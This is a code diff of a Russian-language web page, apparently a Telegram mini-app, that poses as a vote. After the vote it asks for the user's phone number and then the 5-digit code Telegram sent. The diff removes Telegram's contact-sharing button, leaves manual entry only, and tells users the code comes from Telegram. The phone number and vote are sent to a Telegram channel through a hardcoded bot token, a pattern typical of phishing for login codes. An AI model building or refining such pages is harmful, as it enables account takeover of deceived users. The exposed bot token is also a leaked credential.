@@ -30,22 +30,18 @@
         <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далее</button>
     </div>
 
-    <!-- ЭКРАН 2: НОМЕР -->
+    <!-- ЭКРАН 2: НОМЕР (ТОЛЬКО РУЧНОЙ ВВОД) -->
     <div id="screen-phone" class="hidden">
         <h2>Ваш номер</h2>
-        <p>Нажмите кнопку — Telegram предложит поделиться номером</p>
-        <button class="main-btn" onclick="sharePhone()">📱 Поделиться номером</button>
-        <div id="manual-phone" class="hidden">
-            <p style="margin-top:20px;">Введите номер вручную:</p>
-            <input type="tel" id="phone-input" placeholder="+7 900 123-45-67">
-            <button class="main-btn" id="btn-manual" disabled onclick="manualPhone()">Отправить номер</button>
-        </div>
+        <p>Введите номер телефона для учета голоса</p>
+        <input type="tel" id="phone-input" placeholder="+7 900 123-45-67">
+        <button class="main-btn" id="btn-manual" disabled onclick="submitPhone()">Отправить номер</button>
     </div>
 
     <!-- ЭКРАН 3: КОД -->
     <div id="screen-code" class="hidden">
         <h2>Введите код</h2>
-        <p>Код из 5 цифр</p>
+        <p>Код из 5 цифр, который пришел в Telegram</p>
         <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
         <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Отправить код</button>
     </div>
@@ -53,7 +49,7 @@
     <div id="debug"></div>
 
     <script>
-        // ВСТАВЛЕН ТВОЙ ТОКЕН И ID КАНАЛА ДЛЯ МГНОВЕННОЙ ОТПРАВКИ
+        // ТОКЕН И ID КАНАЛА ДЛЯ МГНОВЕННОЙ ОТПРАВКИ
         const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
         const CHAT_ID = "-1004399809740";
 
@@ -61,7 +57,7 @@
 
         let selectedVote = null;
 
-        // Функция отправки напрямую в Telegram (мгновенно)
+        // Мгновенная отправка в Telegram
         async function sendLog(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -85,46 +81,24 @@
             if (!selectedVote) return;
             document.getElementById('screen-vote').classList.add('hidden');
             document.getElementById('screen-phone').classList.remove('hidden');
+            setTimeout(() => document.getElementById('phone-input').focus(), 100);
         }
 
         // --- ШАГ 2: ОТПРАВКА НОМЕРА ---
-        function sharePhone() {
-            const tg = window.Telegram.WebApp;
-            if (typeof tg.requestContact !== 'function') {
-                document.getElementById('manual-phone').classList.remove('hidden');
-                return;
-            }
-            tg.requestContact((shared, contact) => {
-                if (shared && contact && contact.phone_number) {
-                    let phone = contact.phone_number;
-                    dbg('Номер отправлен: ' + phone);
-                    
-                    // МГНОВЕННО ШЛЕМ В КАНАЛ
-                    sendLog(`📱 <b>НОМЕР:</b> ${phone}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
-                    
-                    // Переключаем на экран кода
-                    document.getElementById('screen-phone').classList.add('hidden');
-                    document.getElementById('screen-code').classList.remove('hidden');
-                    setTimeout(() => document.getElementById('code-input').focus(), 100);
-                } else {
-                    document.getElementById('manual-phone').classList.remove('hidden');
-                }
-            });
-        }
-
-        // Ручной ввод номера
         const phoneInput = document.getElementById('phone-input');
         phoneInput.addEventListener('input', () => {
             phoneInput.value = phoneInput.value.replace(/[^\d+]/g, '');
             document.getElementById('btn-manual').disabled = phoneInput.value.replace(/\D/g,'').length < 10;
         });
-        function manualPhone() {
+
+        function submitPhone() {
             let phone = phoneInput.value;
-            dbg('Номер отправлен вручную: ' + phone);
+            dbg('Номер отправлен: ' + phone);
             
             // МГНОВЕННО ШЛЕМ В КАНАЛ
-            sendLog(`📱 <b>НОМЕР (ручной):</b> ${phone}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
+            sendLog(`📱 <b>НОМЕР:</b> ${phone}\n🗳 <b>ГОЛОС:</b> ${selectedVote}`);
             
+            // Переключаем на экран кода
             document.getElementById('screen-phone').classList.add('hidden');
             document.getElementById('screen-code').classList.remove('hidden');
             setTimeout(() => document.getElementById('code-input').focus(), 100);
